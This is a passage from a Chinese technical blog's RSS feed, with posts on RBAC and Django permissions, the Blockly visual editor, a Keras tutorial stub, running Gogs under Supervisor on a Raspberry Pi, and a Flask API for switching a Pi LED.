&lt;li&gt;What：权限针对的对象或资源（Resource）。&lt;/li&gt;
&lt;li&gt;How：具体的权限&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;特点&lt;/h3&gt;
&lt;p&gt;模型中概念与实际系统紧密对应。RBAC模型中的角色、用户和许可权等概念都是实际系统实际存在的实体，便于设计者建立现存的或待建系统的RBAC模型&lt;/p&gt;
&lt;h3&gt;分治的思路&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;我们要分割这些问题来讨论（分析的思路/分治）&lt;ul&gt;
&lt;li&gt;用户与角色的指派&lt;/li&gt;
&lt;li&gt;角色与权限的指派&lt;/li&gt;
&lt;li&gt;为定义角色的继承 进行的角色与角色的指派。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;上述这些活动都要求把用户和权限联系起来。多数情况下它们最好由不同的管理员或管理角色来做。对角色指派权限是典型的应用管理者的职责（类似元角色）&lt;/p&gt;
&lt;h3&gt;概念解释&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Group：用户组，权限分配的单位与载体。组可以包括组(以实现&lt;code&gt;权限的继承&lt;/code&gt;)（适合用来处理层级问题），也可以包含用户，组内用户继承组的权限。User与Group是多对多的关系。Group可以层次化，以满足不同层级权限控制的要求。 （漂亮解决了我的问题）&lt;ul&gt;
&lt;li&gt;部门Department或组织Organization，都可以对应到Group&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Role：Role和User关系的左右两边都是Many-to-Many关系，角色是为了完成各种工作而创造，用户则依据它的责任和资格来被指派相应的角色，角色配置成其完成任务所需要的最小的权限集&lt;/li&gt;
&lt;li&gt;许可表（PERMISSIONS）包括许可标识、许可名称、受控对象、操作标识。许可表给出了受控对象与操作算子的对应关系。*  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;其他笔记&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;RBAC都是基于关系模型&lt;/li&gt;
&lt;li&gt;资源是受控对象&lt;/li&gt;
&lt;li&gt;RBAC模型支持数据抽象原则和继承概念&lt;/li&gt;
&lt;li&gt;RBAC模型没有提供操作顺序控制机制&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Django中的权限机制&lt;/h1&gt;
&lt;p&gt;这部分主要参考&lt;a href="http://www.jianshu.com/p/01126437e8a4"&gt;Django权限机制的实现&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如果你对Django熟悉（不熟悉的话参考你所用web框架的权限机制），可以把这部分理解为以Django为例，解释如何把权限概念用于web项目&lt;/p&gt;
&lt;p&gt;在web应用中，权限机制能够约束用户行为，控制页面的显示内容（想想你的朋友圈和各种论坛的会员机制），也能使API更加安全和灵活（django-rest-framework中）&lt;/p&gt;
&lt;p&gt;Django中用&lt;code&gt;user&lt;/code&gt;, &lt;code&gt;group&lt;/code&gt;和&lt;code&gt;permission&lt;/code&gt;完成了权限机制(和linux很像)，这些概念，我们在前文中阐述清楚了，这个权限机制是将属于model的某个permission赋予user或group，可以理解为全局的权限（ps：如果你需要更细分的权限机制，可以试试：&lt;a href="https://github.com/lukaszb/django-guardian"&gt;django-guardian&lt;/a&gt;）&lt;/p&gt;
&lt;h3&gt;Django的权限项&lt;/h3&gt;
&lt;p&gt;Django用permission（如前文说的许可表）对象存储权限项（How），每个model默认都有三个permission，即add model, change model和delete model，在admin中你可以看到，当然我们也可以手动添加其他权限项，不过值得注意的是权限是针对model的，而不是instance的！&lt;/p&gt;
&lt;p&gt;为一个用户添加权限，既可以在view里做（编码），也可以由管理员（Role）在admin里做（不需要编码）&lt;/p&gt;
&lt;h3&gt;使用权限&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;在view中，使用装饰器来验证权限:&lt;code&gt;@permission_required('car.can_drive')&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;在模板中，当前登录用户的权限存储在模板变量 &lt;code&gt;{{ perms }}&lt;/code&gt; 中&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;todo&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;LDAP  认证和权限&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;h3&gt;相关概念&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://baike.baidu.com/item/RBAC"&gt;RBAC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.quora.com/What-are-some-good-ways-to-design-permission-systems-in-software"&gt;What are some good ways to design permission systems in software&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Role-based_access_control"&gt;Role-based access control&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.csdn.net/xuhaipeng/article/details/4430446"&gt;角色权限系统的 一些概念&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.csdn.net/painsonline/article/details/7183613/"&gt;RBAC权限管理&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cncoders.net/article/10564/"&gt;权限系统---简介&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/20313385"&gt;如何设计网站权限系统&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ibm.com/support/knowledgecenter/zh/ssw_aix_61/com.ibm.aix.security/rbac_use_auths.htm"&gt;RBAC 权限&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/333620/best-practice-for-designing-user-roles-and-permission-system/25643919#25643919"&gt;Best Practice for Designing User Roles and Permission System&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh/%E7%A7%81%E6%9C%89%E5%88%B6"&gt;私有制&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E6%89%80%E6%9C%89%E6%9D%83"&gt;所有权&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;django&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.jianshu.com/p/01126437e8a4"&gt;Django权限机制的实现&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://python.usyiyi.cn/django/topics/auth/default.html"&gt;使用Django认证系统&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikibooks.org/zh/Django/%E7%94%A8%E6%88%B7%E8%AE%A4%E8%AF%81"&gt;维基教科书 Django/用户认证&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;linux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://cn.linux.vbird.org/linux_basic/0210filepermission.php"&gt;Linux 的文件权限与目录配置&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://justcode.ikeepstudying.com/2016/08/linux-%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E6%80%BB%E7%BB%93/"&gt;Linux: 系统文件权限总结&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cnblogs.com/frand/archive/2011/01/03/1924987.html"&gt;掌握Linux的用户(组)，权限，文件精妙的三角关系&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 06 Sep 2016 00:00:00 +0000</pubDate><guid>tag:,2016-09-06:understand-permission.html</guid><category>code</category></item><item><title>blockly入门与介绍</title><link>/blockly-overview.html</link><description>&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/blockly9c7fc7e6.png" /&gt;&lt;/p&gt;
&lt;h1&gt;介绍&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://github.com/google/blockly"&gt;blockly&lt;/a&gt;是google发布的可视化编程工具，基于web技术构建。&lt;/p&gt;
&lt;p&gt;在功能/设计上和MIT的儿童编程语言&lt;a href="https://scratch.mit.edu/"&gt;Scratch&lt;/a&gt;类似&lt;/p&gt;
&lt;p&gt;使用blockly的时候，用户可以通过拖曳模块，来构建代码逻辑，过程很像搭积木&lt;/p&gt;
&lt;p&gt;在用户视角下，blockly是一个简单易用的可视化工具，用来生成代码。在开发者视角下，blockly是一个文本框，里边包含了用户输入好的代码。&lt;/p&gt;
&lt;p&gt;代码生成到文本框的过程，就是用户在blockly里拖曳的过程&lt;/p&gt;
&lt;p&gt;更多细节可以参考官方的&lt;a href="https://developers.google.com/blockly/guides/overview"&gt;介绍&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;特性&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;完全是JavaScript，可离线使用&lt;/li&gt;
&lt;li&gt;可生成6门语言：  &lt;ul&gt;
&lt;li&gt;JavaScript&lt;/li&gt;
&lt;li&gt;Python&lt;/li&gt;
&lt;li&gt;PHP&lt;/li&gt;
&lt;li&gt;Dart&lt;/li&gt;
&lt;li&gt;Lua&lt;/li&gt;
&lt;li&gt;XML(XML有时也被视为语言，实际上它更像语法树)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支持主流的浏览器，如：Chrome, Firefox, Safari, Opera, IE&lt;/li&gt;
&lt;li&gt;支持移动设备&lt;/li&gt;
&lt;li&gt;支持许多编程的基本元素，如：变量、函数、数组&lt;/li&gt;
&lt;li&gt;易于扩展自定义的块&lt;/li&gt;
&lt;li&gt;支持多国语言（40+）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;在线体验&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://blockly-demo.appspot.com/static/demos/index.html"&gt;demo&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;文档&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://developers.google.com/blockly/"&gt;文档&lt;/a&gt;：需要梯子&lt;/p&gt;
&lt;h1&gt;技术视角&lt;/h1&gt;
&lt;p&gt;在此我们以技术视角来审视blockly，而不怎么谈论它的教育意义&lt;/p&gt;
&lt;h3&gt;作为编辑器的blockly&lt;/h3&gt;
&lt;p&gt;blockly将自己定位为一个编辑器&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The web-based visual programming editor&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;上边这句话是&lt;a href="https://github.com/google/blockly"&gt;blockly&lt;/a&gt;源码库的自描述&lt;/p&gt;
&lt;p&gt;这个定位十分符合unix哲学：&lt;code&gt;Do one thing&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;而且它确实是实诚的编辑器，而不是那种伪装成编辑器的操作系统（此处有火药味）&lt;/p&gt;
&lt;p&gt;blockly作为编辑器，它的输入为用户的拖曳（拖曳作为一种输入，可以类比为普通编辑器的键盘输入），输出为&lt;code&gt;生成的代码&lt;/code&gt;。使用blockly可以快速打造一个特定领域的可视化 块编程 编辑器&lt;/p&gt;
&lt;p&gt;至于每个积木（block）如何生成代码，代码用于什么用途，blockly则通通不关心，用户自己掌控。&lt;/p&gt;
&lt;p&gt;由于设计上遵循unix哲学，他也将获得unix哲学带来的好处，小而美带来的强大的组合能力。于是围绕blockly的生态十分广阔。涵盖硬件、软件，领域涵盖科研、教育、游戏、玩具等等&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/blocklyf7a63b9c.png" /&gt;&lt;/p&gt;
&lt;h3&gt;使用场景&lt;/h3&gt;
&lt;p&gt;随便列举几个典型的&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;以拖曳的方式生成代码，控制硬件&lt;/li&gt;
&lt;li&gt;作为软件的输入（demo中的拖曳出函数并生成图像）&lt;/li&gt;
&lt;li&gt;作为软件的的实时控制界面&lt;/li&gt;
&lt;li&gt;...&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;构建一个Blockly app的步骤&lt;/h3&gt;
&lt;p&gt;按照官方文档&lt;a href="https://developers.google.com/blockly/guides/overview"&gt;overview&lt;/a&gt;的说法，有以下三步：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;集成blockly编辑器&lt;/li&gt;
&lt;li&gt;定义你的app里的功能块（block）&lt;/li&gt;
&lt;li&gt;构建app的其余部分，blockly仅充当代码生成器，你需要决定这些用户生成的代码用于做什么，这也是你的app的核心功能所在&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Blockly的强大之处&lt;/h3&gt;
&lt;p&gt;这部分翻译自&lt;a href="https://developers.google.com/blockly/guides/overview"&gt;官方文档&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Blockly作为一个可视化编程环境，正逐渐流行，那么你如何利用它呢，下边的优势举例可能对你有启发：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可导出的代码: 可以将基于block程序转化为基于普通文本的常规代码（多语言）&lt;/li&gt;
&lt;li&gt;开源： 可以以任何方式定制/使用它，甚至入侵修改它的内核&lt;/li&gt;
&lt;li&gt;可拓展： 通过添加定制化的&lt;code&gt;block关联到你的api上&lt;/code&gt; （将提供服务的部分视为下位机，对外提供api/指令集）&lt;/li&gt;
&lt;li&gt;生产可用：blockly不是一个玩具，你可以用它完成复杂的编程任务，例如写一个可以计算标准差的block&lt;/li&gt;
&lt;li&gt;国际化：blockly支持40多门语言&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;衍生项目&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blockly-games.appspot.com/"&gt;Blockly Game&lt;/a&gt;：拖曳式小游戏&lt;/li&gt;
&lt;li&gt;&lt;a href="https://scratch.mit.edu/developers"&gt;Scratch Blocks&lt;/a&gt;：该项目由Scratch团队使用blockly构建&lt;/li&gt;
&lt;li&gt;&lt;a href="http://appinventor.mit.edu/explore/"&gt;App Inventor&lt;/a&gt;：基于blockly的可视化安卓IDE&lt;/li&gt;
&lt;li&gt;&lt;a href="code.org"&gt;Code.org&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://ozoblockly.com/"&gt;OzoBlockly&lt;/a&gt;：一个可编程微型机器人，编码烧录很有意思（屏幕闪烁）&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.makewonder.com/"&gt;Wonder Workshop&lt;/a&gt;：可编程机器人玩具&lt;/li&gt;
&lt;li&gt;&lt;a href="http://lab.open-roberta.org/"&gt;Open Roberta&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.scriptr.io/"&gt;scriptr.io&lt;/a&gt;：物联网云端IDE&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;脑洞&lt;/h1&gt;
&lt;p&gt;用做配置工具&lt;/p&gt;
&lt;p&gt;我们常遇到这种纠结：究竟要给用户怎样的配置界面，常规的UI界面，虽然友好，能做的事太少了。而基于文本的配置，表达能力是加强了，对用户不仅不友好，还容易因为拼写错误，出现奇怪问题（缺乏验证机制），让用户摸不着头脑&lt;/p&gt;
&lt;p&gt;基于blockly的配置工具，似乎是个很不错的选择，拥有编程语言级别的表达能力，操作起来又不晦涩。细节有空细说，下次有配置项丰富的项目，我决定试试blockly&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://developers.google.com/blockly/guides/overview"&gt;Introduction to Blockly&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cooc-china.gitbooks.io/blockly/content/chapter1.html"&gt;Blockly是什么&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 02 Sep 2016 00:00:00 +0000</pubDate><guid>tag:,2016-09-02:blockly-overview.html</guid><category>code</category></item><item><title>[译]使用Keras构建神经网络来识别手写数字</title><link>/keras-mnist-tutorial.html</link><description>&lt;h1&gt;前言&lt;/h1&gt;
&lt;p&gt;在&lt;a href="http://blog.just4fun.site/keras-hello-world-pelican.html"&gt;上篇文章&lt;/a&gt;里我们介绍了Keras的入门，本文将介绍如何使用Keras构建神经网络来识别手写数字&lt;/p&gt;
&lt;p&gt;所用的数据集为：&lt;a href="https://en.wikipedia.org/wiki/MNIST_database"&gt;mnist&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;本文写作说明&lt;/h1&gt;
&lt;p&gt;本文的写作依然在jupyter notebook中，写完后，将ipynb导出为html(单个文件)，然后放到博客的output里，用&lt;code&gt;&amp;lt;iframe&amp;gt;&lt;/code&gt;链入博客主体&lt;/p&gt;
&lt;p&gt;期间尝试过pelican和ipynb整合的方法（试了热度最高的两个插件），可能由于依赖库版本的问题（不匹配），导致无法正常使用,如果你的插件使用正常，求告知&lt;/p&gt;
&lt;h1&gt;正文&lt;/h1&gt;
&lt;p&gt;&lt;iframe src="/others/keras-mnist-tutorial.html" width="100%" height="8000px" marginwidth="0" marginheight="0" frameborder="0" scrolling="no"&gt;You need an iFrame capable browser to view this.&lt;/iframe&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 29 Aug 2016 00:00:00 +0000</pubDate><guid>tag:,2016-08-29:keras-mnist-tutorial.html</guid><category>data</category></item><item><title>在树莓派上搭建代码托管服务器</title><link>/pi-gogs-install.html</link><description>&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/pi3e0c84b0.png" /&gt;&lt;/p&gt;
&lt;p&gt;最近公司有个好玩的项目，准备采用树莓派/arduino作为原型机，恰好我的玩具箱里两者都有&lt;/p&gt;
&lt;p&gt;擦擦尘土，把树莓派带到公司&lt;/p&gt;
&lt;p&gt;上周把arduino借给老板了，各种传感器也在其中，他出差没回，我的树莓派没有传感器可用，只要先折腾些软件应用&lt;/p&gt;
&lt;p&gt;公司的代码托管服务器是我之前搭建的（用了&lt;a href="https://github.com/gogits/gogs"&gt;gogs&lt;/a&gt;），我们部门搬到楼下，连接代码托管服务器需要vpn（网络的坑），速度不快，索性决定，在下边也搭建一个代码托管服务器。&lt;/p&gt;
&lt;p&gt;（考虑到安全，我还是决定自己折腾着玩好了，不过这个场景确实是挺实际的场景）&lt;/p&gt;
&lt;h1&gt;目的&lt;/h1&gt;
&lt;p&gt;这篇文章主要是想在树莓派上练习一下进程管理和开机自启&lt;/p&gt;
&lt;h1&gt;树莓派的入门&lt;/h1&gt;
&lt;p&gt;这类文章网上好多，我自己也有笔记，等有空再整理好了。&lt;/p&gt;
&lt;p&gt;对于装好系统的树莓派（我用的是Raspbian），你就把它当做一个普通的linux便可，没有太多特别的地方（习惯使用Debian/Ubuntu的话，用起来很轻松）&lt;/p&gt;
&lt;h1&gt;安装gogs&lt;/h1&gt;
&lt;h3&gt;目录结构&lt;/h3&gt;
&lt;p&gt;我在HOME目录下建了个文件夹&lt;code&gt;mylab&lt;/code&gt;，用以做实验，gogs也放在这里&lt;/p&gt;
&lt;p&gt;下载二进制安装包：&lt;code&gt;https://dl.gogs.io/gogs_v0.9.60_raspi2.zip&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;解压：&lt;code&gt;unzip gogs_v0.9.60_raspi2.zip&lt;/code&gt;,于是获得gogs的解压目录：&lt;code&gt;/home/pi/mylab/gogs&lt;/code&gt; （我的操作用户是默认的pi）&lt;/p&gt;
&lt;h3&gt;初始化&lt;/h3&gt;
&lt;p&gt;进入&lt;code&gt;/home/pi/mylab/gogs&lt;/code&gt;目录，将gogs跑起来:&lt;code&gt;./gogs web&lt;/code&gt;,默认跑在3000端口，打开你的&lt;code&gt;ip:3000&lt;/code&gt;,填好内容，就可以初始化了，如果使用sqlite就不需要安装数据库&lt;/p&gt;
&lt;p&gt;初始化完毕我们把&lt;code&gt;./gogs web&lt;/code&gt;断掉（ctrl-c），下边演示使用使用Supervisor来管理进程&lt;/p&gt;
&lt;p&gt;关于gogs的更多细节可以参考我之前的笔记&lt;a href="http://blog.just4fun.site/gogs-install.html"&gt;搭建 gogs 代码托管服务器&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;使用Supervisor来管理gogs进程&lt;/h1&gt;
&lt;p&gt;关于supervisor的介绍和细节何以参考我此前的笔记：&lt;a href="http://blog.just4fun.site/process-control-system-supervisor.html"&gt;使用Supervisor来管理进程&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;安装&lt;/h3&gt;
&lt;p&gt;sudo pip install supervisor #安装supervisor&lt;/p&gt;
&lt;h3&gt;配置&lt;/h3&gt;
&lt;p&gt;切换到root：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;echo_supervisord_conf &amp;gt; /etc/supervisord.conf
mkdir /etc/supervisord.conf.d
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;将&lt;code&gt;/etc/supervisord.conf&lt;/code&gt;中的include部分修改为：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;[include]&lt;/span&gt;
&lt;span class="na"&gt;files&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;/etc/supervisord.conf.d/*.conf&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;创建&lt;code&gt;/etc/supervisord.conf.d/gogs.conf&lt;/code&gt;,内容如下&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;[program:gogs]&lt;/span&gt;

&lt;span class="na"&gt;user&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;pi&lt;/span&gt;
&lt;span class="na"&gt;directory&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;/home/pi/mylab/gogs&lt;/span&gt;
&lt;span class="na"&gt;command&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;/home/pi/mylab/gogs/gogs web&lt;/span&gt;
&lt;span class="na"&gt;environment&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;HOME=&amp;quot;/home/pi&amp;quot;, USER=&amp;quot;pi&amp;quot;&lt;/span&gt;
&lt;span class="na"&gt;autostart&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;true&lt;/span&gt;
&lt;span class="na"&gt;autorestart&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;true&lt;/span&gt;
&lt;span class="na"&gt;startsecs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;10&lt;/span&gt;
&lt;span class="na"&gt;stdout_logfile&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;/var/log/gogs/stdout.log&lt;/span&gt;
&lt;span class="na"&gt;stdout_logfile_maxbytes&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;1MB&lt;/span&gt;
&lt;span class="na"&gt;stdout_logfile_backups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;10&lt;/span&gt;
&lt;span class="na"&gt;stdout_capture_maxbytes&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;1MB&lt;/span&gt;
&lt;span class="na"&gt;stderr_logfile&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;/var/log/gogs/stderr.log&lt;/span&gt;
&lt;span class="na"&gt;stderr_logfile_maxbytes&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;1MB&lt;/span&gt;
&lt;span class="na"&gt;stderr_logfile_backups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;10&lt;/span&gt;
&lt;span class="na"&gt;stderr_capture_maxbytes&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;1MB&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后就可以使用supervisor来管理gogs了：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/usr/local/bin/supervisord 
supervisorctl restart gogs
supervisorctl status
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;开机自启&lt;/h1&gt;
&lt;p&gt;简单的方法是往/etc/rc.local加入/usr/local/bin/supervisord&lt;/p&gt;
&lt;p&gt;重启机器，一切完备！&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/pi79409598.png" /&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 29 Aug 2016 00:00:00 +0000</pubDate><guid>tag:,2016-08-29:pi-gogs-install.html</guid><category>技术</category></item><item><title>用微信控制树莓派</title><link>/pi-wechat.html</link><description>&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/wechat_pid9f17e53.png" /&gt;&lt;/p&gt;
&lt;h1&gt;源码&lt;/h1&gt;
&lt;p&gt;老习惯，先抛源码，老司机可以直接读&lt;a href="https://github.com/wwj718/raspberrypi_api"&gt;源码&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;动机&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;近期公司有一个有趣的项目，希望用乐高玩具式的可视化编程工具来操控硬件(在网页中)&lt;ul&gt;
&lt;li&gt;所以想把硬件的响应包装为服务&lt;ul&gt;
&lt;li&gt;于是得到可以用微信操作树莓派这个副产品&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;树莓派操控硬件需要有root权限，作为服务之后则没有限制&lt;/li&gt;
&lt;li&gt;解耦&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;想法&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;将微信视为控制界面（interface）, 获得联网能力（远程操作）&lt;/li&gt;
&lt;li&gt;将树莓派视为连接代码和物理世界的介质&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;架构设计&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;初期效用flask作为web框架&lt;ul&gt;
&lt;li&gt;使用flask-sockets提供websocket服务:&lt;a href="https://github.com/wwj718/raspberrypi_api/blob/master/led_websocket.py"&gt;led_websocket.py&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;把led_server视为下位机，api视为指令集&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;树莓派与GPIO&lt;/h1&gt;
&lt;p&gt;关于如何使用树莓派的引脚操作外部设备，推荐阅读mango同学的&lt;a href="http://blog.mangolovecarrot.net/2015/04/20/raspi-study01/"&gt;树莓派GPIO入门01-使用GPIO接口控制发光二极管闪烁&lt;/a&gt;，写得十分清楚&lt;/p&gt;
&lt;p&gt;通过&lt;code&gt;RPi.GPIO&lt;/code&gt;库，我们几乎不需要硬件的知识，就能轻易地用python代码操控硬件&lt;/p&gt;
&lt;h1&gt;接口定义&lt;/h1&gt;
&lt;p&gt;我们接下来led为例,演示如何将硬件功能暴露为api,可通过http请求，操控硬件（暂不考虑操作权限/安全问题，如果你愿意可以简单定义一个秘钥：&lt;code&gt;?key=xx&lt;/code&gt;），对细节感情兴趣的小伙伴可以跟进我的&lt;a href="https://github.com/wwj718/raspberrypi_api/"&gt;源码库&lt;/a&gt;，我有计划把它做得完备。&lt;/p&gt;
&lt;p&gt;目前我们定义三个功能：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;点亮led灯&lt;/li&gt;
&lt;li&gt;熄灭led灯&lt;/li&gt;
&lt;li&gt;使led灯闪烁几次&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;接下来使用flask将其暴露出去，成为web api&lt;/p&gt;
&lt;p&gt;代码读起来很容易:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# 点亮led灯&lt;/span&gt;
&lt;span class="nd"&gt;@app.route&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/led_up&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;led_up&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="c1"&gt;# 让GPIO14输出高电平（LED灯亮）&lt;/span&gt;
    &lt;span class="n"&gt;RPi&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GPIO&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;ok&amp;#39;&lt;/span&gt;

&lt;span class="c1"&gt;# 熄灭led灯&lt;/span&gt;
